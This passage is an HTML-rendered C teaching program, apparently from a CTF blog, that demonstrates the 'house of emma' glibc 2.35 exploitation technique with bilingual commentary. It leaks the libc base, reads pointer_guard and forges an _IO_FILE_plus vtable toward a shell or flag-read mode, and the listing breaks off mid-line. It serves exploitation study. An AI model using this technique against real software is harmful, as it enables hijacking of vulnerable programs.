class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br><span class="line">428</span><br><span class="line">429</span><br><span class="line">430</span><br><span class="line">431</span><br><span class="line">432</span><br><span class="line">433</span><br><span class="line">434</span><br><span class="line">435</span><br><span class="line">436</span><br><span class="line">437</span><br><span class="line">438</span><br><span class="line">439</span><br><span class="line">440</span><br><span class="line">441</span><br><span class="line">442</span><br><span class="line">443</span><br><span class="line">444</span><br><span class="line">445</span><br><span class="line">446</span><br><span class="line">447</span><br><span class="line">448</span><br><span class="line">449</span><br><span class="line">450</span><br><span class="line">451</span><br><span class="line">452</span><br><span class="line">453</span><br><span class="line">454</span><br><span class="line">455</span><br><span class="line">456</span><br><span class="line">457</span><br><span class="line">458</span><br><span class="line">459</span><br><span class="line">460</span><br><span class="line">461</span><br><span class="line">462</span><br><span class="line">463</span><br><span class="line">464</span><br><span class="line">465</span><br><span class="line">466</span><br><span class="line">467</span><br><span class="line">468</span><br><span class="line">469</span><br><span class="line">470</span><br><span class="line">471</span><br><span class="line">472</span><br><span class="line">473</span><br><span class="line">474</span><br><span class="line">475</span><br><span class="line">476</span><br><span class="line">477</span><br><span class="line">478</span><br><span class="line">479</span><br><span class="line">480</span><br><span class="line">481</span><br><span class="line">482</span><br><span class="line">483</span><br><span class="line">484</span><br><span class="line">485</span><br><span class="line">486</span><br><span class="line">487</span><br><span class="line">488</span><br><span class="line">489</span><br><span class="line">490</span><br><span class="line">491</span><br><span class="line">492</span><br><span class="line">493</span><br><span class="line">494</span><br><span class="line">495</span><br><span class="line">496</span><br><span class="line">497</span><br><span class="line">498</span><br><span class="line">499</span><br><span class="line">500</span><br><span class="line">501</span><br><span class="line">502</span><br><span class="line">503</span><br><span class="line">504</span><br><span class="line">505</span><br><span class="line">506</span><br><span class="line">507</span><br><span class="line">508</span><br><span class="line">509</span><br><span class="line">510</span><br><span class="line">511</span><br><span class="line">512</span><br><span class="line">513</span><br><span class="line">514</span><br><span class="line">515</span><br><span class="line">516</span><br><span class="line">517</span><br><span class="line">518</span><br><span class="line">519</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> GETSHELL_MODE 1</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ORW_MODE 2</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// IMPORTANT! YOU CAN CHANGE THE MODE HERE</span></span><br><span class="line"><span class="type">int</span> mode = ORW_MODE;</span><br><span class="line"><span class="type">char</span>* sh = <span class="string">&quot;/bin/sh&quot;</span>;</span><br><span class="line"><span class="type">char</span>* flag = <span class="string">&quot;./flag&quot;</span>;</span><br><span class="line"><span class="type">size_t</span> space[<span class="number">0x100</span>];</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    setvbuf(<span class="built_in">stdin</span>,<span class="number">0LL</span>,<span class="number">2</span>,<span class="number">0LL</span>);</span><br><span class="line">    setvbuf(<span class="built_in">stdout</span>,<span class="number">0LL</span>,<span class="number">2</span>,<span class="number">0LL</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[32mHello! today let&#x27;s learn something about house of emma.\033[0m&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[32m本程序用于演示house of emma的漏洞利用原理。\033[0m&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[1;31mTested in Ubuntu 22.04, glibc version: Ubuntu GLIBC 2.35-0ubuntu3.1\033[0m&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[1;31m测试环境：Ubuntu 22.04，glibc版本为2.35-0ubuntu3.1\033[0m&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[32mHouse of emma is used for high version of glibc, it utilizes _IO_FILE struct to exploit.\033[0m&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[32mhouse of emma 适用于高版本glibc，它使用_IO_FILE结构体进行漏洞利用。\033[0m&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[32mSame as other way of exploitation with _IO_FILE, it also use fake _IO_FILE struct.\033[0m&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[32m与其他利用_IO_FILE结构体漏洞的方法相同，它也利用了伪造的_IO_FILE结构体。\n\033[0m&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[32mIt can be triggered by function __malloc_assert, so it always go with heap vulnerabilities.\033[0m&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[32m它可以通过函数__malloc_assert触发，因此它常常与堆漏洞相联系。\033[0m&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[32mFirst we need to know the structure of _IO_FILE in glibc 2.35:\033[0m&quot;</span></span><br><span class="line">         <span class="string">&quot;\033[32m首先我们需要了解一下glibc 2.35版本下_IO_FILE结构体的内容：\n\033[0m&quot;</span></span><br><span class="line">         <span class="string">&quot;\033[33m(line 49, /libio/bits/types/struct_FILE.h)\033[0m&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[34mstruct _IO_FILE\n&quot;</span></span><br><span class="line">         <span class="string">&quot;&#123;\n&quot;</span></span><br><span class="line">         <span class="string">&quot;  int _flags;\t\t/* High-order word is _IO_MAGIC; rest is flags. */\n&quot;</span></span><br><span class="line">         <span class="string">&quot;\n&quot;</span></span><br><span class="line">         <span class="string">&quot;  /* The following pointers correspond to the C++ streambuf protocol. */\n&quot;</span></span><br><span class="line">         <span class="string">&quot;  char *_IO_read_ptr;\t/* Current read pointer */\n&quot;</span></span><br><span class="line">         <span class="string">&quot;  char *_IO_read_end;\t/* End of get area. */\n&quot;</span></span><br><span class="line">         <span class="string">&quot;  char *_IO_read_base;\t/* Start of putback+get area. */\n&quot;</span></span><br><span class="line">         <span class="string">&quot;  char *_IO_write_base;\t/* Start of put area. */\n&quot;</span></span><br><span class="line">         <span class="string">&quot;  char *_IO_write_ptr;\t/* Current put pointer. */\n&quot;</span></span><br><span class="line">         <span class="string">&quot;  char *_IO_write_end;\t/* End of put area. */\n&quot;</span></span><br><span class="line">         <span class="string">&quot;  char *_IO_buf_base;\t/* Start of reserve area. */\n&quot;</span></span><br><span class="line">         <span class="string">&quot;  char *_IO_buf_end;\t/* End of reserve area. */\n&quot;</span></span><br><span class="line">         <span class="string">&quot;\n&quot;</span></span><br><span class="line">         <span class="string">&quot;  /* The following fields are used to support backing up and undo. */\n&quot;</span></span><br><span class="line">         <span class="string">&quot;  char *_IO_save_base; /* Pointer to start of non-current get area. */\n&quot;</span></span><br><span class="line">         <span class="string">&quot;  char *_IO_backup_base;  /* Pointer to first valid character of backup area */\n&quot;</span></span><br><span class="line">         <span class="string">&quot;  char *_IO_save_end; /* Pointer to end of non-current get area. */\n&quot;</span></span><br><span class="line">         <span class="string">&quot;\n&quot;</span></span><br><span class="line">         <span class="string">&quot;  struct _IO_marker *_markers;\n&quot;</span></span><br><span class="line">         <span class="string">&quot;\n&quot;</span></span><br><span class="line">         <span class="string">&quot;  struct _IO_FILE *_chain;\n&quot;</span></span><br><span class="line">         <span class="string">&quot;\n&quot;</span></span><br><span class="line">         <span class="string">&quot;  int _fileno;\n&quot;</span></span><br><span class="line">         <span class="string">&quot;  int _flags2;\n&quot;</span></span><br><span class="line">         <span class="string">&quot;  __off_t _old_offset; /* This used to be _offset but it&#x27;s too small.  */\n&quot;</span></span><br><span class="line">         <span class="string">&quot;\n&quot;</span></span><br><span class="line">         <span class="string">&quot;  /* 1+column number of pbase(); 0 is unknown. */\n&quot;</span></span><br><span class="line">         <span class="string">&quot;  unsigned short _cur_column;\n&quot;</span></span><br><span class="line">         <span class="string">&quot;  signed char _vtable_offset;\n&quot;</span></span><br><span class="line">         <span class="string">&quot;  char _shortbuf[1];\n&quot;</span></span><br><span class="line">         <span class="string">&quot;\n&quot;</span></span><br><span class="line">         <span class="string">&quot;  _IO_lock_t *_lock;\n&quot;</span></span><br><span class="line">         <span class="string">&quot;#ifdef _IO_USE_OLD_IO_FILE\n&quot;</span></span><br><span class="line">         <span class="string">&quot;&#125;;\n\033[0m&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[32mThe key element we need to forge is the *vtable pointer.\033[0m&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[32m其中的关键就是*vtable指针。\033[0m&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[32mIt&#x27;s worth noticing that we need to write correct *_lock value in our fake _IO_FILE.\033[0m&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[32m值得注意的是，我们需要写入正确的*_lock指针值到伪造的_IO_FILE结构体中。\033[0m&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[32mThe value of *_lock should be \033[31m_IO_stdfile_1_lock.\033[0m&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[32m*_lock的值应该是\033[31m_IO_stdfile_1_lock.\033[0m&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[32mSo that we need to know the loading base address of libc.\033[0m&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[32m所以我们需要知道libc的加载基地址。\n\033[0m&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[35mNow let&#x27;s get loading base address of libc through the address of function puts().\033[0m&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[35m现在让我们通过puts()函数获取一下libc的加载基地址。\033[0m&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span>(*func)(<span class="type">const</span> <span class="type">char</span>*)  = <span class="built_in">puts</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[32mThe address of function puts() is: \033[31m%p\n\033[0m&quot;</span>, func);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[32mputs函数的地址为: \033[31m%p\n\033[0m&quot;</span>, func);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[32mSo that the loading address of libc is: \033[31m%p\n\033[0m&quot;</span>, func - <span class="number">0x80ed0</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[32m因此libc的加载地址为: \033[31m%p\n\033[0m&quot;</span>, func - <span class="number">0x80ed0</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[33m(The offset address of function puts() is 0x80ed0)\033[0m&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[33m(puts函数的偏移量为0x80ed0)\n\033[0m&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="type">size_t</span> libc_base = (<span class="type">size_t</span>)(func - <span class="number">0x80ed0</span>);</span><br><span class="line">    <span class="type">size_t</span> stderr_ptr = (<span class="type">size_t</span>)(libc_base + <span class="number">0x21a860</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[32mSince we know the libc base address, we can also know the address of pointer stderr: \033[31m%p\033[0m\n&quot;</span>, (<span class="type">void</span>*)stderr_ptr);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[32m既然现在我们已经知道了libc的加载地址，我们也可以获得stderr指针的地址: \033[31m%p\033[0m\n&quot;</span>, (<span class="type">void</span>*)stderr_ptr);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[32mNow let&#x27;s satisfy the second prerequisite of the exploit: \033[0m&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[32m下面让我们构造一下这个漏洞利用的第二个前提条件: \033[0m&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[33mGet the value of pointer_guard or change it to a known value.\033[0m&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[33m获取到pointer_guard的值并将其修改为一个已知值。\033[0m&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[32mOur house of emma has a stable call chain, and we&#x27;ll need the value to guide rip to the function we want.\033[0m&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[32m我们的house of emma利用方式有一条完整的函数调用链，我们需要这个pointer_guard的值来引导rip到我们想要的函数。\033[0m&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[32mWhere the value is used will be introduced later.\033[0m&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[32m我们之后将会介绍这个pointer_guard的地址在什么地方。\033[0m&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[32mIt&#x27;s worth noticing that\033[31m the value of pointer guard is not located in libc, while before libc.\033[0m&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[32m需要注意的是pointer guard的值并不在libc中，而是在libc的低地址处。\033[0m&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[32mIf you use pwndbg, you can see that before libc, there exists an anonymous space, with its size of 0x3000.\033[0m&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[32m如果使用pwndbg，你可以看到在libc前面有一个匿名的内存区域，大小为0x3000。\033[0m&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[32mThe tls struct is located in this anonymous area, which includes the value of pointer_guard.\033[0m&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[32mtls结构体就位于这个匿名的内存空间中，它包含有pointer_guard。\033[0m&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[32mTo be more detail, the value of pointer_guard is located in (libc_base - 0x3000 + 0x770)\033[0m&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[32m更具体地说，pointer_guard的值应该位于(libc_base - 0x3000 + 0x770)\n\033[0m&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[32mActually, the name of the struct is \033[31mtcbhead_t\033[32m. Here is the structure:\033[0m&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[32m实际上，这个结构体的名字是\033[31mtcbhead_t\033[32m. 下面是它的构造:\033[0m&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[33m(line 36, /sysdeps/x86_64/nptl/tls.h)\033[0m&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[34mtypedef struct\n&quot;</span></span><br><span class="line">         <span class="string">&quot;&#123;\n&quot;</span></span><br><span class="line">         <span class="string">&quot;  void *tcb;\t\t/* Pointer to the TCB.  Not necessarily the\n&quot;</span></span><br><span class="line">         <span class="string">&quot;\t\t\t   thread descriptor used by libpthread.  */\n&quot;</span></span><br><span class="line">         <span class="string">&quot;  dtv_t *dtv;\n&quot;</span></span><br><span class="line">         <span class="string">&quot;  void *self;\t\t/* Pointer to the thread descriptor.  */\n&quot;</span></span><br><span class="line">         <span class="string">&quot;  int multiple_threads;\n&quot;</span></span><br><span class="line">         <span class="string">&quot;  int gscope_flag;\n&quot;</span></span><br><span class="line">         <span class="string">&quot;  uintptr_t sysinfo;\n&quot;</span></span><br><span class="line">         <span class="string">&quot;  uintptr_t stack_guard;\n&quot;</span></span><br><span class="line">         <span class="string">&quot;  uintptr_t pointer_guard;\n&quot;</span></span><br><span class="line">         <span class="string">&quot;  unsigned long int unused_vgetcpu_cache[2];\n&quot;</span></span><br><span class="line">         <span class="string">&quot;  /* Bit 0: X86_FEATURE_1_IBT.\n&quot;</span></span><br><span class="line">         <span class="string">&quot;     Bit 1: X86_FEATURE_1_SHSTK.\n&quot;</span></span><br><span class="line">         <span class="string">&quot;   */\n&quot;</span></span><br><span class="line">         <span class="string">&quot;  unsigned int feature_1;\n&quot;</span></span><br><span class="line">         <span class="string">&quot;  int __glibc_unused1;\n&quot;</span></span><br><span class="line">         <span class="string">&quot;  /* Reservation of some values for the TM ABI.  */\n&quot;</span></span><br><span class="line">         <span class="string">&quot;  void *__private_tm[4];\n&quot;</span></span><br><span class="line">         <span class="string">&quot;  /* GCC split stack support.  */\n&quot;</span></span><br><span class="line">         <span class="string">&quot;  void *__private_ss;\n&quot;</span></span><br><span class="line">         <span class="string">&quot;  /* The lowest address of shadow stack,  */\n&quot;</span></span><br><span class="line">         <span class="string">&quot;  unsigned long long int ssp_base;\n&quot;</span></span><br><span class="line">         <span class="string">&quot;  /* Must be kept even if it is no longer used by glibc since programs,\n&quot;</span></span><br><span class="line">         <span class="string">&quot;     like AddressSanitizer, depend on the size of tcbhead_t.  */\n&quot;</span></span><br><span class="line">         <span class="string">&quot;  __128bits __glibc_unused2[8][4] __attribute__ ((aligned (32)));\n&quot;</span></span><br><span class="line">         <span class="string">&quot;\n&quot;</span></span><br><span class="line">         <span class="string">&quot;  void *__padding[8];\n&quot;</span></span><br><span class="line">         <span class="string">&quot;&#125; tcbhead_t;\033[0m&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[32mWe can see that the stack guard is right above the pointer guard, so we can&#x27;t absolutely change the stack_guard.\033[0m&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[32m我们可以发现stack_guard就在pointer_guard的上面，因此我们绝对不能修改stack_guard的值。\033[0m&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[32mLet&#x27;s calculate the address of pointer_guard: \033[31m%p\033[0m\n&quot;</span>, (<span class="type">size_t</span>*)(libc_base - <span class="number">0x3000</span> + <span class="number">0x770</span>));</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[32m让我们计算一下pointer_guard的地址: \033[31m%p\033[0m\n&quot;</span>, (<span class="type">size_t</span>*)(libc_base - <span class="number">0x3000</span> + <span class="number">0x770</span>));</span><br><span class="line"></span><br><span class="line">    <span class="type">size_t</span>* pointer_guard_address = (<span class="type">size_t</span>*)(libc_base - <span class="number">0x3000</span> + <span class="number">0x770</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[32mThe value of pointer_guard is: \033[31m%#zx\033[0m\n&quot;</span>, *pointer_guard_address);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[32mpointer_guard的值为: \033[31m%#zx\033[0m\n&quot;</span>, *pointer_guard_address);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[32mIn CTF problems you can&#x27;t always get the original value of pointer_guard, but you can also change it to a known value.\033[0m&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[32m在CTF赛题中你可能不能获取到pointer_guard的值，但你可以将其改写为一个已知值。\n\033[0m&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[32mOK, now we can try to forge a _IO_FILE struct.\033[0m&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[32m那么现在我们就来开始伪造_IO_FILE结构体。\033[0m&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[32mAttention: what we forge is actually _IO_FILE_plus struct, which contains a _IO_FILE struct and a vtable pointer(_IO_jump_t*)\033[0m&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[32m注意：我们伪造的实际上是_IO_FILE_plus结构体，其包含_IO_FILE结构体的所有内容以及一个vtable指针(_IO_jump_t*)\033[0m&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span>* <span class="title">fake_file_struct</span> =</span> (<span class="keyword">struct</span> _IO_FILE*)<span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line">    <span class="type">size_t</span>* vtable = (<span class="type">size_t</span>*)((<span class="type">char</span>*)fake_file_struct + <span class="keyword">sizeof</span> (<span class="keyword">struct</span> _IO_FILE));</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[32mWe just allocate a fake _IO_FILE_plus struct into the heap: \033[31m%p\033[m\n&quot;</span>, fake_file_struct);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[32m我们刚刚分配了一个假的_IO_FILE_plus结构体到堆: \033[31m%p\033[m\n&quot;</span>, fake_file_struct);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[32mThe address of fake _IO_FILE_plus is: \033[31m%p\033[0m\n&quot;</span>, fake_file_struct);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[32m这个假的_IO_FILE_plus结构体的地址为: \033[31m%p\033[0m\n&quot;</span>, fake_file_struct);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[32mThe address of vtable pointer is: \033[31m%p\033[0m\n&quot;</span>, vtable);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[32mvtable指针的地址为: \033[31m%p\033[0m\n&quot;</span>, vtable);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[32mThen we are going to change the value of _lock and vtable pointer.\033[0m&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[32m然后我们来修改_lock和vtable指针的值。\033[0m&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[32mThe _lock should be changed into \033[31m_IO_stdfile_1_lock\033[32m, which is in \033[31m(libc_base + 0x21ba70).\033[0m&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[32m_lock的值应该被修改为\033[31m_IO_stdfile_1_lock\033[32m, 它的地址为\033[31m(libc_base + 0x21ba70).\033[0m&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[32mThe vtable should be changed into \033[31m(_IO_cookie_jumps + 0x38)\033[32m, &quot;</span></span><br><span class="line">         <span class="string">&quot;which points to function \033[31m_IO_file_xsputn.\033[0m&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[32mvtable指针应该被修改为\033[31m(_IO_cookie_jumps + 0x38)\033[32m, &quot;</span></span><br><span class="line">         <span class="string">&quot;其指向函数\033[31m_IO_file_xsputn.\033[0m\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[32mBefore 